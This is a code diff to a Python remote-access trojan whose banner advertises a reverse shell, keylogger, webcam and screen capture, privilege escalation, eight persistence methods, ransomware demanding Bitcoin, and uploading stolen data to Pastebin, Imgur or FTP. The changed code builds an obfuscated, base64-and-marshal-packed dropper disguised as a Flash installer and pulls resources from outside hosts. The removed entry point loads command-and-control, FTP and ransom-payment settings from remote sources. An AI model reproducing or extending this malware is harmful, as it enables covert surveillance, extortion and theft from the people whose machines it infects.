@@ -23,7 +23,6 @@
 
 """
  
- 
         ,adPPYYba, 8b,dPPYba,   ,adPPYb,d8 88,dPPYba,   aa       aa
         ""     `Y8 88P'   `"8a a8"    `Y88 88P'   `"8a  88       88
         ,adPPPPP88 88       88 8b       88 88	        8b       88
@@ -31,7 +30,6 @@
         `"8bbdP"Y8 88       88  `"YbbdP"Y8 88            `"YbbdP"Y8
                                 aa,    ,88 	         aa,    ,88
                                  "Y8bbdP"                 "Y8bbdP'
-
                                                        88                          ,d
                                                        88                          88
          ,adPPYba,  ,adPPYb,d8  ,adPPYb,d8 8b,dPPYba,  88 ,adPPYYba, 8b,dPPYba,    88
@@ -42,30 +40,28 @@
                     aa,    ,88  aa,    ,88 88                                      "Y888
                      "Y8bbdP"    "Y8bbdP"  88
 
-
-
-                            https://github.com/colental/ae
-
-
+                            
     >  30 modules - interactive or automated
-        - reverse tcp:   remotely access host machine with a shell inspired by Meterpreter in the Metasploit Framework
-        - keylogger:     log user keystrokes with the window they were entered in
-        - webcam:        capture image/video or stream live
-        - screenshot:    snap shots of the host desktop
-        - root access:   obtain administrator privileges
-        - persistence:   maintain access with 8 different persistence methods
-        - port scanner:  explore the local network for more hosts, open ports, vulnerabilities
-        - packetsniffer: monitor host network traffic for valuable information
-        - ransom:        encrypt host files and ransom them to the user for Bitcoin
-        - upload:        automatically upload results to Imgur, Pastebin, or a remote FTP server
-
+        - Reverse Shell   remotely access host machine with a shell
+        - Root Acess      obtain administrator privileges
+        - Keylogger       log user keystrokes with the window they were entered in
+        - Webcam          capture image/video or stream live
+        - Screenshot      snap shots of the host desktop
+        - Persistence     maintain access with 8 different persistence methods
+        - Portscanner     explore the local network for more hosts, open ports, vulnerabilities
+        - Packetsniffer   monitor host network traffic for valuable information
+        - Ransom          encrypt host files and ransom them to the user for Bitcoin
+        - Upload          automatically upload results to Imgur, Pastebin, or a remote FTP server
+        - Email           Outlook email of a logged in user can be accessed without authentication
+        - SMS texting     Send & receive SMS text messages with user's contacts
+        
     >  Portability - supports all major platforms and architectures
         - automated payload configuration
         - zero dependencies whatsoever (not even Python is required)
-        - dynamically compiles deliverables as executables native to the host environment
+        - dynamically compiles unique droppers as native executables
         - no downloads, no installations, no configuration, no dependencies
-
-    >  Security - encrypted communication, anti-forensics counter-measures
+        
+    >  Security - encrypted communication, anti-forensics
         - all communication is encrypted end-to-end
         - AES cipher in CBC mode - secure data confidentiality
         - HMAC-SHA256 hash authentication - secure data authenticity
@@ -74,7 +70,9 @@
 
 """
 
-for pkg in '''import os
+
+for pkg in '''
+import os
 import sys
 import imp
 import mss
@@ -105,29 +103,18 @@ from Crypto.PublicKey import RSA
 from Crypto.Hash import SHA256, HMAC
 from Crypto.Cipher import AES, PKCS1_OAEP
 from Crypto.Util.number import long_to_bytes, bytes_to_long
-from cv2 import VideoCapture, VideoWriter, VideoWriter_fourcc, imwrite, waitKey'''.splitlines():
-    try:
-        exec pkg in globals()
-    except ImportError:
-        ClientPayload.debug("Import error: {}".format(pkg))
-    
-if os.name is 'nt':
-    for p in '''from wmi import WMI
+from cv2 import VideoCapture, VideoWriter, VideoWriter_fourcc, imwrite, waitKey
+from wmi import WMI
 from pyHook import HookManager
 from pythoncom import PumpMessages, CoInitialize
 from win32com.client import Dispatch
 from win32com.shell.shell import ShellExecuteEx
-from _winreg import OpenKey, SetValueEx, CloseKey, HKEY_CURRENT_USER, REG_SZ, KEY_WRITE'''.splitlines():
+from _winreg import OpenKey, SetValueEx, CloseKey, HKEY_CURRENT_USER, REG_SZ, KEY_WRITE
+from pyxhook import HookManager
+'''.splitlines():
         try:
-            exec p in globals()
-        except ImportError:
-            ClientPayload.debug("Import error: {}".format(p))
-
-else:
-    try:
-        exec "from pyxhook import HookManager" in globals()
-    except: pass
-
+            exec pkg in globals()
+        except: pass
 
 
 def config(*arg, **options):
@@ -147,8 +134,8 @@ def config(*arg, **options):
 class ClientPayload(object):
 
     __name__ = 'ClientPayload'
-    _abort   = 0
-    _debug   = 1
+    _abort   = False
+    _debug   = True
     _config  = OrderedDict()
     _tasks   = Queue.Queue()
     _lock    = threading.Lock()
@@ -953,11 +940,14 @@ class ClientPayload(object):
         try:
             if not self.persistence.methods['payload_dropper']['established']:
                 try:
-                    self.persistence.methods['payload_dropper']['established'], self.persistence.methods['payload_dropper']['result'] = self._persistence_add_payload_dropper()
+                    established, result = self._persistence_add_payload_dropper()
+                    self.persistence.methods['payload_dropper']['established'] = established
+                    self.persistence.methods['payload_dropper']['result'] = result
                 except Exception as e0:
                     self.debug("{} error: {}".format(self.persistence.func_name, str(e0)))
-                    self.persistence.methods['payload_dropper']['established'], self.persistence.methods['payload_dropper']['result'] = (False, None)
-            elif not os.path.isfile(self.persistence.methods['payload_dropper']['result']):
+                    self.persistence.methods['payload_dropper']['established']= False
+                    self.persistence.methods['payload_dropper']['result'] = None
+            elif not os.path.isfile(str(self.persistence.methods['payload_dropper']['result'])):
                 self.persistence.methods['payload_dropper']['established'] = False
                 self.persistence.methods['payload_dropper']['result'] = None
         except Exception as e:
@@ -965,27 +955,17 @@ class ClientPayload(object):
 
 
     @config(platforms=['win32','linux2','darwin'])
-    def _persistence_add_payload_dropper(self, name='flash', exe=True):
+    def _persistence_add_payload_dropper(self, name='flashinstaller'):
         try:
-            if self._config['resources'].get('dropper'):
-                temp = os.path.expandvars('%TEMP%') if os.name is 'nt' else '/tmp'
-                code = self._config['resources'].get('dropper').get('code')
+            if self._config['resources'].get('dropper') and self._config['resources']['dropper'].get('code') and self._config['resources']['dropper'].get('config'):
+                code = "\n".join((self._config['resources'].get('dropper').get('code'), "\nif __name__=='__main__':\n\t_debug=bool('--debug' in sys.argv)\n\tmain(config={})".format(self._config['resources']['dropper']['config'].get('r'))))
                 data = "import zlib,base64,marshal;exec(marshal.loads(zlib.decompress(base64.b64decode({}))))".format(repr(base64.b64encode(zlib.compress(marshal.dumps(compile(code, '', 'exec')), 9))))
-                path = os.path.join(temp, '%s.py' % name)
+                path = os.path.join(os.path.expandvars('%TEMP%') if os.name is 'nt' else '/tmp', '{}-{}.{}.{}.py'.format(name, random.randint(27,29), random.randint(0,1), random.randint(10,99)))
                 with file(path, 'w') as fp:
                     fp.write(data)
-                if exe:
-                    key  = self._get_random_var(16)
-                    work = os.path.join(temp, 'build')
-                    icon = self.wget(self._config['resources']['dropper']['icons']['flash']['ico' if os.name is 'nt' else ('icns' if 'darwin' in sys.platform else 'png')])
-                    done = subprocess.call('%s -m PyInstaller --clean --onefile --workdir %s --distdir %s -w --icon %s --key %s %s' % (sys.executable, work, temp, icon, key, path)) == 0
-                    if done:
-                        os.rmdir(work)
-                        os.remove(path)
-                        path = os.path.splitext(path)[0] + '.exe' if os.name is 'nt' else os.path.splitext(path)[0]                        
                 return (True, path)
             else:
-                 return (False, "Error: missing resources required for encrypted dropper")
+                 return (False, "Error: missing payload dropper build resources")
         except Exception as e:
             return (False, '{} error: {}'.format(self._persistence_add_payload_dropper.func_name, str(e)))
         
@@ -993,8 +973,8 @@ class ClientPayload(object):
     @config(platforms=['win32','linux2','darwin'])
     def _persistence_remove_payload_dropper(self, *args, **kwargs):
         try:
-            target = self.persistence.methods['payload_dropper']['result']
-            if isinstance(target, bytes) and os.path.isfile(target):
+            target = self.persistence.methods['payload_dropper'].get('result')
+            if os.path.isfile(str(target)):
                 if os.name is 'nt':
                     unhide = os.popen('attrib -h %s' % target).read()
                 os.remove(target)
@@ -1672,13 +1652,16 @@ class ClientPayload(object):
 
     def _get_startup(self, **kwargs):
         try:
+            methods = self.persistence.methods.keys()
+            for method in methods:
+                self.persistence.methods[method].update({'platforms': getattr(self, '_persistence_add_{}'.format(method)).platforms})
             resources = {'ports': json.loads(urllib.urlopen('https://pastebin.com/raw/BCjkh5Gh').read()), 'icons': {'flash': {'ico':'http://elderlyeggplant.000webhostapp.com/icon.ico', 'png':'http://elderlyeggplant.000webhostapp.com/icon.png', 'icns': 'http://elderlyeggplant.000webhostapp.com/icon.icns'}}}
             if ClientPayload._config.get('resources'):
                 ClientPayload._config['resources'].update(resources)
             else:
                 ClientPayload._config['resources'] = resources
         except Exception as e1:
-            ClientPayload.debug("{} error: {}".format(self._get_startup.func_name, str(e1)))
+            self.debug("{} error: {}".format(self._get_startup.func_name, str(e1)))
   
 
     def _get_command(self):
@@ -2319,41 +2302,35 @@ class ClientPayload(object):
             self.debug("{} error: '{}'".format(self.screenshot.func_name, str(e)))
 
 
-    @config(platforms=['win32','linux2','darwin'], methods={method: {'established': bool(), 'result': bytes()} for method in ['payload_dropper','hidden_file','scheduled_task','registry_key','startup_file','launch_agent','crontab_job']}, command=True, usage='persistence <args>')
+    @config(platforms=['win32','linux2','darwin'], methods={method: {'established': bool(), 'result': bytes()} for method in ['payload_dropper','hidden_file','scheduled_task','registry_key','startup_file','launch_agent','crontab_job']}, command=True, usage='persistence <add/remove> [method]')
     def persistence(self, args=None):
         """
         establish persistence to survive reboots
         """
         try:
             if not args:
-                if not self.persistence.methods['payload_dropper']['established']:
-                    try:
-                        self.persistence.methods['payload_dropper']['established'], self.persistence.methods['payload_dropper']['result'] = self._persistence_add_payload_dropper()
-                    except Exception as e0:
-                        self.debug("{} error: {}".format(self.persistence.func_name, str(e0)))
-                        self.persistence.methods['payload_dropper']['established'], self.persistence.methods['payload_dropper']['result'] = (False, None)
-                elif not os.path.isfile(self.persistence.methods['payload_dropper']['result']):
-                        self.persistence.methods['payload_dropper']['established'] = False
-                        self.persistence.methods['payload_dropper']['result'] = None
-                for method in [_ for _ in self.persistence.methods if 'payload_dropper' != method if not self.persistence.methods[_]['established']]:
-                    target = '_persistence_add_{}'.format(method)
-                    if sys.platform in getattr(self, target).platforms:
-                        self.persistence.methods[method]['established'], self.persistence.methods[method]['result'] = getattr(self, target)()
-                return json.dumps({k: v for k,v in self.persistence.methods if sys.platform in getattr(self, k).platforms}, indent=2)
+                return self.persistence.usage
             else:
                 cmd, _, method = str(args).partition(' ')
-                if 'method' in cmd:
-                    return json.dumps(self.persistence.methods)
-                elif not method or cmd not in ('add','remove') or method not in self.persistence.methods:
-                    return self.persistence.usage
-                elif self.persistence.methods[method].get('established'):
-                    return json.dumps(self.persistence.methods[method])
-                else:
+                if not method or cmd not in ('add','remove'):
+                    return str(self.persistence.usage + '\nmethods: %s' % ', '.join([m for m in self.persistence.methods if sys.platform in getattr(self, k).platforms]))
+                elif method == 'all':
                     self._persistence_check()
-                    target = '_persistence_{}_{}'.format(method)
+                    for method in [_ for _ in self.persistence.methods if 'payload_dropper' != method if not self.persistence.methods[_]['established']]:
+                        target = '_persistence_{}_{}'.format(cmd, method)
+                        if sys.platform in getattr(self, target).platforms:
+                            self.persistence.methods[method]['established'], self.persistence.methods[method]['result'] = getattr(self, target)()
+                    return json.dumps({k: v for k,v in self.persistence.methods if sys.platform in getattr(self, k).platforms})
+                elif method in self.persistence.methods:
+                    if self.persistence.methods[method].get('established'):
+                        return json.dumps(self.persistence.methods[method])
+                    self._persistence_check()
+                    target = '_persistence_{}_{}'.format(cmd, method)
                     if sys.platform in getattr(self, target).platforms:
                         self.persistence.methods[method]['established'], self.persistence.methods[method]['result'] = getattr(self, target)()
                     return json.dumps(self.persistence.methods[method])
+                else:
+                    return str(self.persistence.usage + '\nmethods: %s' % ', '.join([m for m in self.persistence.methods if sys.platform in getattr(self, k).platforms]))
         except Exception as e:
             self.debug("{} error: '{}'".format(self.persistence.func_name, str(e)))
 
@@ -2498,80 +2475,3 @@ class ClientPayload(object):
 
 
 
-def main(*args, **kwargs):
-    ClientPayload._config.update({'api': {}, 'tasks': {}, 'resources': {}})
-    if '--debug' in sys.argv:
-        ClientPayload._debug = 1
-        ClientPayload.debug("Debugging enabled")
-    else:
-        ClientPayload._debug = 1
-    if 'w' in kwargs:
-        exec "import urllib" in globals()
-        w = kwargs.get('w')
-        imports = ClientPayload._get_remote_resource(w)
-        exec imports in globals()
-    if 'b' in kwargs:
-        b   =  kwargs.get('b')
-        api_endpoint, api_key = ClientPayload._get_remote_resource(b).splitlines()
-        ClientPayload._config['api']['server'] = {'endpoint': api_endpoint, 'api_key': api_key}
-    if 'q' in kwargs:
-        q = kwargs.get('q')
-        ftp_host, ftp_user, ftp_passwd  = ClientPayload._get_remote_resource(q).splitlines()
-        ClientPayload._config['api']['ftp'] = {'hostname': ftp_host, 'username': ftp_user, 'password': ftp_passwd}
-    if 'c' in kwargs:
-        c = kwargs.get('c')
-        pastebin_api_key, pastebin_user_key = ClientPayload._get_remote_resource(c).splitlines()
-        ClientPayload._config['api']['pastebin'] = {'api_dev_key': pastebin_api_key, 'api_user_key': pastebin_user_key}          
-    if 'o' in kwargs:
-        o = kwargs.get('o')
-        twilio_sid, twilio_token, twilio_phone = ClientPayload._get_remote_resource(o).splitlines()
-        ClientPayload._config['api']['twilio'] = {'account_sid': twilio_sid, 'auth_token': twilio_token, 'phone_number': twilio_phone}
-    if 'd' in kwargs:
-        d = kwargs.get('d')
-        imgur_api_key= ClientPayload._get_remote_resource(d)
-        ClientPayload._config['api']['imgur']  = {'api_key': imgur_api_key}
-    if 'p' in kwargs:
-        p = kwargs.get('p')
-        ransom_payment_url = ClientPayload._get_remote_resource(p)
-        ClientPayload._config['api']['coinbase'] = ransom_payment_url
-    if 'l' in kwargs:
-        l = kwargs.get('l')
-        code = ClientPayload._get_remote_resource(l)
-        ClientPayload._config['resources']['dropper'] = {'code': code}
-        if 'r' in kwargs:
-            r = kwargs.get('r')
-            config = ClientPayload._get_remote_resource(r)
-            config = json.loads(config)
-            ClientPayload._config['resources']['dropper'].update({'config': config})
-    if 'g' in kwargs:
-        g = kwargs.get('g')
-        bash = ClientPayload._get_remote_resource(g)
-        ClientPayload._config['resources']['bash'] = bash
-    if 'v' in kwargs:
-        v = kwargs.get('v')
-        tasks = ClientPayload._get_remote_resource(v).splitlines()
-        ClientPayload._config['tasks'] = tasks
-    payload = ClientPayload()
-    payload.run()
-    return payload
-
-
-
-if __name__ == '__main__':
-    m = main(**{
-  "b": "81266016987952607600",
-  "c": "78671681703351507562",
-  "d": "79030013784106676584",
-  "g": "79328323225122003561",
-  "j": "76650156158318301560",
-  "l": "81040047328712224353",
-  "o": "76297441489967984739",
-  "p": "80692935077109257793",
-  "q": "80324520337976078676",
-  "r": "81126388790932157784",
-  "t": "79310384705633414777",
-  "u": "76299683425183950643",
-  "v": "79169592366247143984",
-  "w": "77888090548015223857",
-  "z": "79892739118577505130"
-})
